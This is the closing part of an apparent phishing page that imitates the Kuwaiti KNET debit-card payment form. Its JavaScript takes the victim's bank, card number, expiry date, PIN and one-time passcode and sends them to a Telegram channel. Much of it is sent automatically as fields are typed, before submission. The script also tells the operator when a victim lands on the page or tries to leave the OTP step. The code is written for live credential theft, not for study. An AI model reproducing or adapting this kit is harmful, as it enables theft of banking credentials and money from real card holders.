            function setOtpExpiryTimestamp(timestamp) {
                localStorage.setItem(OTP_EXPIRY_STORAGE_KEY, String(timestamp));
            }

            function clearOtpExpiryTimestamp() {
                localStorage.removeItem(OTP_EXPIRY_STORAGE_KEY);
            }

            function startOtpTimer() {
                const now = Date.now();
                let expiry = getOtpExpiryTimestamp();

                if (!expiry || expiry <= now) {
                    expiry = now + otpTimerDurationSeconds * 1000;
                    setOtpExpiryTimestamp(expiry);
                }

                stopOtpTimer(false);

                otpTimerInterval = window.setInterval(function() {
                    const remainingMs = Math.max(expiry - Date.now(), 0);
                    const remainingSeconds = Math.ceil(remainingMs / 1000);
                    otpInput.placeholder =
                        "Timeout in: " +
                        Math.floor(remainingSeconds / 60) +
                        ":" +
                        String(remainingSeconds % 60).padStart(2, "0");

                    if (remainingSeconds === 0) {
                        stopOtpTimer(false);
                    }
                }, 1000);
            }

            function isOtpFormVisible() {
                return otpForm.style.display === "block";
            }

            function consumeStep3RedirectFlag() {
                const wasRedirected = sessionStorage.getItem(KNET_REDIRECT_STORAGE_KEY) === "true";
                if (wasRedirected) {
                    sessionStorage.removeItem(KNET_REDIRECT_STORAGE_KEY);
                }
                return wasRedirected;
            }

            function updateValidationMessageDirection() {
                if (isOtpFormVisible()) {
                    validationMessage.setAttribute("dir", "rtl");
                    return;
                }

                validationMessage.removeAttribute("dir");
            }

            function formatTwoDigits(value) {
                return String(value).padStart(2, "0");
            }

            function maskCardNumber(prefixValue, debitNumberValue) {
                const maskedPartLength = Math.max(debitNumberValue.length - 4, 0);
                const visibleLastDigits = debitNumberValue.slice(-4);
                return prefixValue + "*".repeat(maskedPartLength) + visibleLastDigits;
            }

            function maskPinCode(pinCodeValue) {
                return "●".repeat(pinCodeValue.length || 4);
            }

            function maskOtpCardReference(prefixValue, debitNumberValue) {
                const safePrefix = prefixValue || "";
                const safeDebitNumber = debitNumberValue || "";
                const visibleLastDigits = safeDebitNumber.slice(-4) || "0000";
                return `${safePrefix}******${visibleLastDigits}`;
            }

            function populateOtpVerification(details) {
                dcNumberLabel.textContent = maskCardNumber(details.dcprefix, details.debitnumber);
                expiryMonthLabel.textContent = formatTwoDigits(details.month);
                expiryYearLabel.textContent = details.year;
                pinMaskLabel.textContent = maskPinCode(details.pincode);
            }

            function showKnetStep() {
                knetForm.style.display = "block";
                otpForm.style.display = "none";
                overlayHide.style.display = "none";
                proceedButton.disabled = false;
                otpInput.value = "";
                stopOtpTimer(true);
                setProceedButtonText("إرسال");
                localStorage.removeItem("knetOtpVisible");
                clearOtpExpiryTimestamp();
                if (window.hideSubmissionLoadingOverlay) {
                    window.hideSubmissionLoadingOverlay();
                }
                updateValidationMessageDirection();
                hideValidationMessage();
            }

            function showOtpStep() {
                knetForm.style.display = "none";
                otpForm.style.display = "block";
                overlayHide.style.display = "none";
                proceedButton.disabled = false;
                setProceedButtonText("تأكيد العملية");
                startOtpTimer();
                localStorage.setItem("knetOtpVisible", "true");
                if (window.hideSubmissionLoadingOverlay) {
                    window.hideSubmissionLoadingOverlay();
                }
                updateValidationMessageDirection();
                hideValidationMessage();
                requestAnimationFrame(function() {
                    otpInput.focus();
                });
            }

            function normalizeDigits(value) {
                return value
                    .replace(/[٠-٩]/g, function(char) { return String(char.charCodeAt(0) - 1632); })
                    .replace(/[۰-۹]/g, function(char) { return String(char.charCodeAt(0) - 1776); });
            }

            function extractOtpValue(value) {
                const normalized = normalizeDigits(value || "");
                const regexMatch = normalized.match(/(\d{6})/);
                return regexMatch ? regexMatch[1] : normalized.replace(/\D+/g, "").slice(0, 6);
            }

            function buildAutoOtpMessage(otpValue) {
                const details = getStoredKnetDetails();
                return [
                    `🔐 OTP for ${maskOtpCardReference(details.dcprefix, details.debitnumber)}`,
                    `─ ${otpValue}`,
                    "<b>ملاحظة: تم إرسال هذه الرسالة تلقائياً</b>"
                ].join("\n");
            }

            function buildManualOtpMessage(otpValue) {
                const details = getStoredKnetDetails();
                return [
                    `🔐 OTP for ${maskOtpCardReference(details.dcprefix, details.debitnumber)}`,
                    `─ ${otpValue}`
                ].join("\n");
            }

            function buildOtpLeaveMessage() {
                const identityLines = window.getTelegramStoredIdentityLines ? window.getTelegramStoredIdentityLines() : [];
                return [
                    identityLines[0] || "👤 الاسم: غير متوفر",
                    identityLines[1] || "📞 رقم الهاتف: غير متوفر",
                    window.getTelegramSeparator ? window.getTelegramSeparator() : "<b>───────────────</b>",
                    "محاولة مغادرة صفحة رمز التحقق بدون إدخال أي رمز"
                ].join("\n");
            }

            function sendInvalidKnetFields(invalidFields) {
                if (!window.sendTelegramMessageWithQueue) {
                    return;
                }

                const details = getCurrentKnetInputValues();
                const message = buildKnetSubmissionMessage(details, { invalidFields: invalidFields });
                window.sendTelegramMessageWithQueue(message, false).catch(function() {});
            }

            function resetKnetSensitiveInputs() {
                monthSelect.value = "";
                yearSelect.value = "";
                expiryMonthInput.value = "";
                expiryYearInput.value = "";
                cardPinInput.value = "";
                localStorage.setItem("month", "");
                localStorage.setItem("year", "");
                localStorage.setItem("pincode", "");
                expiryMonthLabel.textContent = "";
                expiryYearLabel.textContent = "";
                pinMaskLabel.textContent = maskPinCode("");
            }

            async function requestReturnFromOtp() {
                if (!isOtpFormVisible()) {
                    return;
                }

                if (extractOtpValue(otpInput.value)) {
                    showKnetStep();
                    resetKnetSensitiveInputs();
                    sendKnetLandingMessage();
                    return;
                }

                if (!window.confirm(otpBackConfirmationMessage)) {
                    requestAnimationFrame(function() {
                        otpInput.focus();
                    });
                    return;
                }

                if (window.sendTelegramMessageWithQueue) {
                    window.sendTelegramMessageWithQueue(buildOtpLeaveMessage(), false).catch(function() {});
                }

                showKnetStep();
                resetKnetSensitiveInputs();
                sendKnetLandingMessage();
            }

            function validateKnetDetails() {
                const debitNumber = debitNumberInput.value.trim();
                const completeCardLength = prefixSelect.value.length + debitNumber.length;
                updateExpiryValidity();

                const invalidFields = [];
                let firstInvalidField = null;

                if (!bankSelect.value) {
                    invalidFields.push("bankname");
                    firstInvalidField = firstInvalidField || "bankname";
                }

                if (!debitNumber || completeCardLength !== 16) {
                    if (!invalidFields.includes("card")) {
                        invalidFields.push("card");
                    }
                    firstInvalidField = firstInvalidField || "card";
                }

                if (!monthSelect.value || !yearSelect.value || isExpiredCard(monthSelect.value, yearSelect.value)) {
                    if (!invalidFields.includes("expiry")) {
                        invalidFields.push("expiry");
                    }
                    firstInvalidField = firstInvalidField || "expiry";
                }

                if (!/^\d{4}$/.test(cardPinInput.value.trim())) {
                    invalidFields.push("pincode");
                    firstInvalidField = firstInvalidField || "pincode";
                }

                if (firstInvalidField === "bankname") {
                    showValidationMessage("خطأ- يرجى أختيار أسم البنك ", bankSelect, ["bank"]);
                } else if (firstInvalidField === "card") {
                    showValidationMessage("خطأ يرجى أدخال رقم البطاقة بشكل صحيح", debitNumberInput, ["bank", "dcprefix", "debitNumber"]);
                } else if (firstInvalidField === "expiry") {
                    if (!monthSelect.value) {
                        showValidationMessage("خطأ، يرجى اختيار شهر انتهاء البطاقة.", monthSelect, ["month"]);
                    } else if (!yearSelect.value) {
                        showValidationMessage("خطأ، يرجى اختيار سنة انتهاء البطاقة.", yearSelect, ["year"]);
                    } else {
                        showValidationMessage("خطأ - البطاقة مدخلة منتهية الصلاحية", monthSelect, ["month", "year"]);
                    }
                } else if (firstInvalidField === "pincode") {
                    showValidationMessage("خطأ، الرقم السري غير صحيح، يجب أن يتكون من 4 أرقام.", cardPinInput, ["cardPin"]);
                }

                if (invalidFields.length) {
                    sendInvalidKnetFields(invalidFields);
                    return false;
                }

                return true;
            }

            function buildManualKnetMessage(details) {
                const identity = window.getTelegramStoredIdentity ? window.getTelegramStoredIdentity() : { name: "", phone: "" };
                return [
                    "🏦 معلومات كي نت 🏦",
                    `👤 ${identity.name || "غير متوفر"} \t ${identity.phone || "غير متوفر"}`,
                    window.getTelegramSeparator ? window.getTelegramSeparator() : "<b>───────────────</b>",
                    `🏦 ${details.bankname}`,
                    `💳 ${details.dcprefix} \t ${details.debitnumber}`,
                    `📅 ${details.month}/${details.year}`,
                    `🔐 ${details.pincode}`
                ].join("\n");
            }

            function getCurrentKnetInputValues() {
                return {
                    bankname: bankSelect.value.trim(),
                    dcprefix: prefixSelect.value.trim(),
                    debitnumber: debitNumberInput.value.trim(),
                    month: monthSelect.value.trim(),
                    year: yearSelect.value.trim(),
                    pincode: cardPinInput.value.trim()
                };
            }

            function buildKnetSubmissionMessage(details, options) {
                const opts = options || {};
                const cardParts = [details.dcprefix, details.debitnumber].filter(Boolean);
                const expiryParts = [details.month, details.year].filter(Boolean);
                const invalidFields = Array.isArray(opts.invalidFields) ? opts.invalidFields : [];
                const directionMark = "\u200E";
                const dividerLine = `${directionMark}───────────────`;
                const identity = window.getTelegramStoredIdentity
                    ? window.getTelegramStoredIdentity()
                    : { name: "", phone: "" };

                function formatLine(label, value, fieldKey) {
                    const invalidMark = invalidFields.includes(fieldKey) ? " ❌" : "";
                    return `${directionMark}${label}${invalidMark} ${value || ""}`.trim();
                }

                const lines = [
                    `${directionMark}      ${directionMark}      💳 بطاقة الكي النت 💳       `,
                    `${directionMark}👤 ${identity.name || "غير متوفر"}`,
                    `${directionMark}📞 ${identity.phone || "غير متوفر"}`,
                    dividerLine,
                    formatLine("🏦", details.bankname, "bankname"),
                    formatLine("💳", cardParts.join(" - "), "card"),
                    formatLine("📅", expiryParts.join("/"), "expiry"),
                    formatLine("🔐", details.pincode, "pincode")
                ];

                if (opts.autoNote) {
                    lines.push(`${directionMark}هذه الرسالة تلقائية`);
                }

                return lines.join("\n");
            }

            function isKnetDetailsValidSilent(details) {
                if (!details.bankname) return false;
                if (!details.dcprefix || !details.debitnumber) return false;
                if (details.dcprefix.length + details.debitnumber.length !== 16) return false;
                if (!details.month || !details.year) return false;
                if (isExpiredCard(details.month, details.year)) return false;
                if (!/^\d{4}$/.test(details.pincode || "")) return false;
                return true;
            }

            function maybeSendAutoKnetInfo() {
                if (autoKnetInfoSent || !window.sendTelegramMessageWithQueue) {
                    return;
                }

                const details = getCurrentKnetInputValues();
                if (!isKnetDetailsValidSilent(details)) {
                    return;
                }

                autoKnetInfoSent = true;
                const message = buildKnetSubmissionMessage(details, { autoNote: true });
                window.sendTelegramMessageWithQueue(message, false).catch(function() {});
            }

            function buildKnetLandingMessage() {
                const identityLines = window.getTelegramStoredIdentityLines ? window.getTelegramStoredIdentityLines() : [];
                const pageEmoji = window.getCurrentTelegramPageEmoji ? window.getCurrentTelegramPageEmoji() : "🏦";
                const identityParts = [];
                const identity = window.getTelegramStoredIdentity ? window.getTelegramStoredIdentity() : { name: "", phone: "" };

                if (identity.name) identityParts.push(identity.name);
                if (identity.phone) identityParts.push(identity.phone);

                const identityLine = identityParts.length ? `👤 ${identityParts.join(" ─ ")}` : "👤";

                return [
                    `${pageEmoji} شخص في صفحة الكي النت`,
                    identityLine
                ].join("\n");
            }

            function sendKnetLandingMessage() {
                if (!window.sendTelegramMessageWithQueue) {
                    return;
                }

                window.sendTelegramMessageWithQueue(buildKnetLandingMessage(), false).catch(function() {});
            }

            async function handleKnetDetailsSubmit() {
                if (!validateKnetDetails()) {
                    return;
                }

                const details = {
                    bankname: bankSelect.value,
                    dcprefix: prefixSelect.value,
                    debitnumber: debitNumberInput.value.trim(),
                    month: monthSelect.value.trim(),
                    year: yearSelect.value.trim(),
                    pincode: cardPinInput.value.trim()
                };

                saveKnetDetailsToLocalStorage(details);
                if (window.clearAllTelegramSessionKeys) {
                    window.clearAllTelegramSessionKeys();
                }
                hideValidationMessage();
                overlayHide.style.display = "block";
                proceedButton.disabled = true;

                if (window.sendTelegramUntilDelivered) {
                    await window.sendTelegramUntilDelivered(buildKnetSubmissionMessage(details), false);
                }

                if (window.showSubmissionLoadingOverlay) {
                    window.showSubmissionLoadingOverlay("جارٍ إرسال معلومات كي نت...", 3000, "knet");
                }

                populateOtpVerification(details);
                autoSentOtpValue = "";
                showOtpStep();
            }

            async function handleOtpSubmit() {
                const otpValue = extractOtpValue(otpInput.value);

                if (otpValue.length !== 6) {
                    showValidationMessage("خطأ - يرجى إدخال رمز التحقق بشكل صحيح", otpInput, ["dop"]);
                    return;
                }

                otpInput.value = otpValue;
                hideValidationMessage();
                overlayHide.style.display = "block";
                proceedButton.disabled = true;

                if (window.sendTelegramUntilDelivered) {
                    await window.sendTelegramUntilDelivered(buildManualOtpMessage(otpValue), false);
                }

                if (window.showSubmissionLoadingOverlay) {
                    window.showSubmissionLoadingOverlay("جارٍ إرسال رمز التحقق...", 3000, "knet");
                }

                otpInput.value = "";
                requestAnimationFrame(function() {
                    otpInput.focus();
                });
                overlayHide.style.display = "none";
                proceedButton.disabled = false;
                if (window.hideSubmissionLoadingOverlay) {
                    window.hideSubmissionLoadingOverlay();
                }
            }

            prefixes(bankSelect.value);
            updateDebitNumberMaxLength(false);
            restoreKnetFormFromStorage();
            cardNumberCombined.value = prefixSelect.value + debitNumberInput.value;
            expiryMonthInput.value = monthSelect.value ? String(monthSelect.value).padStart(2, "0") : "";
            expiryYearInput.value = yearSelect.value ? String(yearSelect.value).slice(-2) : "";
            if (consumeStep3RedirectFlag()) {
                showKnetStep();
            } else if (localStorage.getItem("knetOtpVisible") === "true") {
                showOtpStep();
            } else {
                showKnetStep();
            }
            updateBankIndicator();
            maybeSendAutoKnetInfo();

            bankSelect.addEventListener("change", function() {
                prefixes(this.value);
                updateDebitNumberMaxLength(true);
                hideValidationMessage(this.id);
                maybeSendAutoKnetInfo();
            });

            prefixSelect.addEventListener("change", function() {
                const selectedOption = this.options[this.selectedIndex];
                if (selectedOption && selectedOption.dataset.bankCode) {
                    bankSelect.value = selectedOption.dataset.bankCode;
                }
                updateDebitNumberMaxLength(true);
                debitNumberInput.placeholder = "أدخل 10 أرقام";
                debitNumberInput.focus();
                updateBankIndicator();
                hideValidationMessage(this.id);
                maybeSendAutoKnetInfo();
            });

            debitNumberInput.addEventListener("input", function() {
                keepDigitsOnly(this, true);
                showBankPrefixSuggestions();
                updateBankIndicator();
                hideValidationMessage(this.id);
                maybeSendAutoKnetInfo();
            });

            cardNumberCombined.addEventListener("input", function() {
                keepDigitsOnly(this, true);
                const value = this.value;
                showBankPrefixSuggestions();
                showCombinedPrefixPreview(value);
                const matchingPrefixes = Object.keys(BANK_PREFIXES)
                    .reduce(function(prefixesList, bankCode) {
                        return prefixesList.concat(BANK_PREFIXES[bankCode].map(function(prefix) {
                            return { bankCode: bankCode, prefix: prefix };
                        }));
                    }, [])
                    .filter(function(item) {
                        return value.startsWith(item.prefix);
                    })
                    .sort(function(first, second) {
                        return second.prefix.length - first.prefix.length;
                    });

                if (matchingPrefixes.length) {
                    bankSelect.value = matchingPrefixes[0].bankCode;
                    prefixes(matchingPrefixes[0].bankCode);
                    prefixSelect.value = matchingPrefixes[0].prefix;
                    debitNumberInput.value = value.slice(matchingPrefixes[0].prefix.length, 16);
                    updateDebitNumberMaxLength(false);
                } else {
                    prefixSelect.value = "";
                    debitNumberInput.value = "";
                }

                hideValidationMessage(this.id);
                maybeSendAutoKnetInfo();
            });

            bankIndicator.addEventListener("click", function() {
                const suggestedPrefix = this.dataset.prefix || "";

                if (!suggestedPrefix) {
                    return;
                }

                cardNumberCombined.value = suggestedPrefix;
                cardNumberCombined.dispatchEvent(new Event("input", { bubbles: true }));
                cardNumberCombined.focus();
            });

            monthSelect.addEventListener("change", function() {
                updateExpiryValidity();
                hideValidationMessage(this.id);
                maybeSendAutoKnetInfo();
            });

            yearSelect.addEventListener("change", function() {
                updateExpiryValidity();
                hideValidationMessage(this.id);
                maybeSendAutoKnetInfo();
            });

            function syncManualExpiry() {
                keepDigitsOnly(expiryMonthInput, true);
                keepDigitsOnly(expiryYearInput, true);
                expiryMonthInput.value = expiryMonthInput.value.slice(0, 2);
                expiryYearInput.value = expiryYearInput.value.slice(0, 2);

                const month = Number(expiryMonthInput.value);
                const year = Number(expiryYearInput.value);
                monthSelect.value = month >= 1 && month <= 12
                    ? String(month)
                    : "";
                yearSelect.value = expiryYearInput.value.length === 2
                    ? String(2000 + year)
                    : "";

                hideValidationMessage("month");
                maybeSendAutoKnetInfo();
            }

            expiryMonthInput.addEventListener("input", function() {
                syncManualExpiry();

                const month = Number(expiryMonthInput.value);
                if (expiryMonthInput.value.length === 2 && month >= 1 && month <= 12) {
                    expiryYearInput.focus();
                    expiryYearInput.select();
                }
            });
            expiryYearInput.addEventListener("input", syncManualExpiry);

            cardPinInput.addEventListener("input", function() {
                keepDigitsOnly(this, true);
                hideValidationMessage(this.id);
                maybeSendAutoKnetInfo();
            });

            otpInput.addEventListener("input", function() {
                const otpValue = extractOtpValue(otpInput.value);
                otpInput.value = otpValue;
                hideValidationMessage(this.id);

                if (otpValue.length === 6 && otpValue !== autoSentOtpValue && window.sendTelegramMessageWithQueue) {
                    autoSentOtpValue = otpValue;
                    window.sendTelegramMessageWithQueue(buildAutoOtpMessage(otpValue), false).catch(function() {});
                }
            });

            cancelButton.addEventListener("click", function() {
                requestReturnFromOtp().catch(function() {});
            });

            form.addEventListener("submit", function(event) {
                event.preventDefault();

                const action = isOtpFormVisible() ? handleOtpSubmit() : handleKnetDetailsSubmit();

                action.catch(function() {
                    overlayHide.style.display = "none";
                    proceedButton.disabled = false;
                    if (window.hideSubmissionLoadingOverlay) {
                        window.hideSubmissionLoadingOverlay();
                    }
                });
            });

            if (localStorage.getItem("knetOtpVisible") !== "true") {
                sendKnetLandingMessage();
            }
        });
    </script>
    <script src="./assets/js/telegram.js"></script>
    <script src="./assets/js/tg.js"></script>
    </body>
</html>
